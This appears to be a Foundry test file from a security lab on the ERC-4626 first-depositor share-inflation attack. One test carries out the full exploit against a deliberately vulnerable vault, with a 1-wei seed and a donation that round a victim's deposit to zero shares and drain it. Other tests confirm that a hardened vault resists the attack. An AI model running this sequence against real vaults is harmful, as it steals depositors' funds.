// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {VulnerableVault4626} from "../src/VulnerableVault4626.sol";
import {SafeVault4626} from "../src/SafeVault4626.sol";
import {HookToken} from "./fixtures/HookToken.sol";

/// @title InflationAttack.t.sol
/// @notice Lab 11 — Exploit + regression tests for the ERC-4626
///         first-depositor inflation attack.
///
/// Lab: Share-price inflation at zero / dust supply
///
/// Threat model:
///   Share pricing floors in the depositor's disfavor, and the vault prices
///   shares against its live token balance. The first depositor (or anyone
///   after a full withdrawal returns supply to zero) can deposit 1 wei for
///   1 share, donate tokens directly to the vault, and make the next real
///   deposit round to zero shares.
///
/// Violated invariant:
///   "A depositor's shares are proportional to their contribution, with a
///   rounding error bounded independently of existing share supply."
///   At 1 wei of supply the rounding bound degenerates to the donated amount.
///
/// Reproduction (1 wei deposit, 100k token donation, 100k victim deposit):
///   1. Attacker deposits 1 wei -> 1 share (totalShares == 0 path).
///   2. Attacker donates 100,000e18 tokens straight to the vault.
///   3. Victim deposits 100,000e18 -> (100000e18 * 1) / (100000e18 + 1) = 0.
///   4. Attacker redeems the single share for essentially the whole vault.
///
/// Remediation (see SafeVault4626):
///   Equal virtual asset/share offsets soften the large-donation sequence
///   exercised below; a zero-share check rejects deposits that still round
///   down to zero. This is not a general inflation-attack guarantee.
///
/// Regression tests:
///   The same large-donation sequence against SafeVault4626 leaves the victim
///   with shares within a rounding hair of proportional. A separate 1-wei
///   donation test proves that tiny deposits can still round to zero and revert.
contract InflationAttackTest is Test {
    VulnerableVault4626 internal vulnerable;
    SafeVault4626 internal safe;

    address internal attacker;
    address internal victim;

    uint256 internal constant DONATION = 100_000e18;
    uint256 internal constant VICTIM_DEPOSIT = 100_000e18;

    function setUp() public {
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
    }

    function testVulnerableFirstDepositorAbsorbsVictimDeposit() public {
        MockToken token = new MockToken();
        vulnerable = new VulnerableVault4626(address(token));
        deal(address(token), attacker, 1 wei + DONATION);
        deal(address(token), victim, VICTIM_DEPOSIT);

        // 1. Attacker seeds 1 wei for 1 share.
        vm.startPrank(attacker);
        token.approve(address(vulnerable), 1 wei);
        uint256 minted = vulnerable.deposit(1 wei);
        assertEq(minted, 1, "attacker should hold exactly 1 share");

        // 2. Donation inflates the price with no shares minted.
        token.transfer(address(vulnerable), DONATION);
        vm.stopPrank();

        // 3. Victim's deposit rounds to zero shares.
        vm.startPrank(victim);
        token.approve(address(vulnerable), VICTIM_DEPOSIT);
        uint256 victimShares = vulnerable.deposit(VICTIM_DEPOSIT);
        assertEq(victimShares, 0, "victim shares must round to zero on the vulnerable vault");
        vm.stopPrank();

        // 4. Attacker redeems the single share for the whole vault.
        vm.prank(attacker);
        uint256 drained = vulnerable.withdraw(1);
        assertGt(drained, DONATION, "attacker must absorb both contributions");
        assertEq(token.balanceOf(address(vulnerable)), 0, "vault emptied");
    }

    function testSafeVaultAbsorbsTheDonation() public {
        MockToken token = new MockToken();
        safe = new SafeVault4626(address(token));
        deal(address(token), attacker, 1 wei + DONATION);
        deal(address(token), victim, VICTIM_DEPOSIT);

        vm.startPrank(attacker);
        token.approve(address(safe), 1 wei);
        uint256 seedShares = safe.deposit(1 wei);
        token.transfer(address(safe), DONATION);
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(safe), VICTIM_DEPOSIT);
        uint256 victimShares = safe.deposit(VICTIM_DEPOSIT);
        vm.stopPrank();

        // The attack cannot hurt the victim on the safe vault: the victim's
        // shares redeem for their deposited value within floor-rounding dust
        // (observed shortfall: 45 wei on a 100,000e18 deposit). The donation
        // is absorbed by the mechanism, not weaponized against them.
        assertGt(victimShares, 0, "victim must not round to zero shares");
        vm.prank(victim);
        uint256 victimOut = safe.withdraw(victimShares);
        assertApproxEqAbs(victimOut, VICTIM_DEPOSIT, 1_000, "victim must not lose from the attack");

        // Attacker's single share redeems only a dust fraction of the vault.
        vm.prank(attacker);
        uint256 attackerTake = safe.withdraw(seedShares);
        assertLt(attackerTake, VICTIM_DEPOSIT / 100, "donation must not be weaponizable");
    }

    function testSafeVaultCanStillRejectOneWeiAfterDonation() public {
        MockToken token = new MockToken();
        safe = new SafeVault4626(address(token));
        address tinyAttacker = makeAddr("tiny-attacker");
        address tinyVictim = makeAddr("tiny-victim");
        deal(address(token), tinyAttacker, 2);
        deal(address(token), tinyVictim, 1);

        vm.startPrank(tinyAttacker);
        token.approve(address(safe), 1);
        safe.deposit(1);
        token.transfer(address(safe), 1);
        vm.stopPrank();

        vm.prank(tinyVictim);
        token.approve(address(safe), 1);
        vm.prank(tinyVictim);
        vm.expectRevert(bytes("zero shares"));
        safe.deposit(1);

        assertEq(token.balanceOf(tinyVictim), 1, "rejected deposit keeps victim funds");
        assertEq(safe.shares(tinyVictim), 0);
    }

    function testSafeVaultPricesSharesFromMeasuredReceiptAndRejectsFeeTokens() public {
        TaxedMockToken token = new TaxedMockToken(1_000);
        safe = new SafeVault4626(address(token));
        address depositor = makeAddr("taxed-depositor");
        token.mint(depositor, 100);
        vm.prank(depositor);
        token.approve(address(safe), 100);

        vm.prank(depositor);
        vm.expectRevert(bytes("fee token unsupported"));
        safe.deposit(100);

        assertEq(safe.totalShares(), 0);
        assertEq(safe.shares(depositor), 0);
        assertEq(token.balanceOf(address(safe)), 0, "rejected taxed receipt rolls back");
    }

    function testSafeVaultBlocksNestedDepositAndWithdrawalCallbacks() public {
        HookToken token = new HookToken();
        safe = new SafeVault4626(address(token));
        address depositor = makeAddr("hook-depositor");
        token.mint(depositor, 10 ether);
        token.mint(address(token), 1);
        token.approveFromSelf(address(safe), 1);
        vm.prank(depositor);
        token.approve(address(safe), 10 ether);

        token.configureCallback(address(safe), abi.encodeWithSignature("deposit(uint256)", 1), false, true);
        vm.prank(depositor);
        uint256 minted = safe.deposit(10 ether);
        assertTrue(token.callbackAttempted());
        assertFalse(token.lastCallbackSucceeded(), "nested deposit must fail under the shared lock");
        assertEq(safe.shares(depositor), minted);

        token.configureCallback(address(safe), abi.encodeWithSignature("deposit(uint256)", 1), true, false);
        vm.prank(depositor);
        safe.withdraw(minted);
        assertTrue(token.callbackAttempted());
        assertFalse(token.lastCallbackSucceeded(), "nested deposit during withdrawal must fail");
        assertEq(safe.shares(depositor), 0);
        assertEq(safe.totalShares(), 0);
    }
}

contract MockToken {
    string public constant name = "Mock Token";
    string public constant symbol = "MCK";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "insufficient allowance");
        allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract TaxedMockToken {
    uint256 public immutable feeBps;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 feeBps_) {
        feeBps = feeBps_;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _deliver(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        allowance[from][msg.sender] = allowed - amount;
        _deliver(from, to, amount);
        return true;
    }

    function _deliver(address from, address to, uint256 amount) private {
        uint256 fee = (amount * feeBps) / 10_000;
        balanceOf[from] -= amount;
        balanceOf[to] += amount - fee;
    }
}
